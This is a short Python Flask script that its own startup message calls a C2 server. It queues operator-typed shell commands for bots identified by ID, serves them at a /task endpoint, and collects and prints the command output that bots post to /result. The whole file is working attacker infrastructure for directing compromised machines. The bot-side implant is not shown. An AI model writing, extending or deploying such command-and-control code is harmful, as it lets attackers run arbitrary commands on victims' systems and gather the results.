from flask import Flask, request
import threading

app = Flask(__name__)
tasks = {}
results = {}

@app.route('/task', methods=['GET'])
def task():
    bot_id = request.args.get("id")
    return tasks.pop(bot_id, "NONE")

@app.route('/result', methods=['POST'])
def result():
    bot_id = request.form.get("id")
    output = request.form.get("output", "")
    results[bot_id] = output
    print(f"\n📥 Output from {bot_id}:\n{output}")
    return "OK"

def operator():
    while True:
        bot = input("🎯 Enter bot ID: ").strip()
        cmd = input("💻 Command to run: ").strip()
        tasks[bot] = cmd
        print(f"✅ Task queued for {bot}")

threading.Thread(target=operator, daemon=True).start()

if __name__ == '__main__':
    print("🚀 C2 Server Running on http://0.0.0.0:8000")
    app.run(host='0.0.0.0', port=8000)
